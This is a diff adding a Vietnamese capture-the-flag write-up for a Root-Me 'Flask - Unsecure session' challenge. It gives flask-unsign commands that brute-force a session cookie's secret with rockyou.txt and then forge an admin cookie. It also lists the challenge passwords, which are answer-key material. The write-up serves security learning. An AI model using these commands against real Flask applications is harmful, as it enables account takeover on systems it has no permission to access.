@@ -42,6 +42,8 @@
 
 - [File upload - MIME type](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#file-upload---mime-type)
 
+- [Flask - Unsecure session]()
+
 ### HTML - Source code
 
 ![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image.png?raw=true)
@@ -738,6 +740,62 @@ Xác nhận chèn payload thành công. Thay đổi giá trị tham số `comman
 ![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image145.png?raw=true)
 
 **Password: a7n4nizpgQgnPERy89uanf6T4**
+
+### Flask - Unsecure session
+
+![img](146)
+
+Start the challenge:
+
+![img](147)
+
+Request và response khi load trang web:
+
+![img](148)
+
+Webserver trả về 1 session, thử decode với `jwt.io`: 
+
+![img](149)
+
+Truy cập trang Admin:
+
+![img](150)
+
+Request sẽ trông như sau:
+
+![img](151)
+
+Như vậy, ý tưởng là có thể thay giá trị trong header của jwt thành để sinh jwt mới:
+
+    {
+        "admin": "true",
+        "username": "admin",
+    }
+
+Nhưng hiện tại không có chữ ký, có thể phần chữ ký trong jwt gốc là 1 giá trị không hợp lệ. 
+
+Sử dụng tool `flask-unsign` để brute-force tìm ra chữ ký hợp lệ, sử dụng lệnh:
+
+    flask-unsign --wordlist rockyou.txt --unsign --no-literal-eval --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z-xybg.BHYr8gtgg5SNHzb-smjqMfVIxM0'
+
+![img](152)
+
+Tìm ra chữ ký của jwt gốc là `s3cr3t`. Tiếp tục sử dụng `flask-unsign` để sinh jwt mới với header như trên và chữ ký vừa tìm được, dùng lệnh:
+
+    flask-unsign --sign --cookie '{"admin": "true", "username" : "admin"}' --secret 's3cr3t'
+
+![img](153)
+
+-> JWT mới: `eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6ImFkbWluIn0.Z-x3MA.xeNloJaT-uLi5qKaJpG2n9Gipi4`
+
+Thay jwt này vào request và gửi:
+
+![img](154)
+
+**Password: Fl4sK_mi5c0nfigur4ti0n**
+
+
+
 
 
 
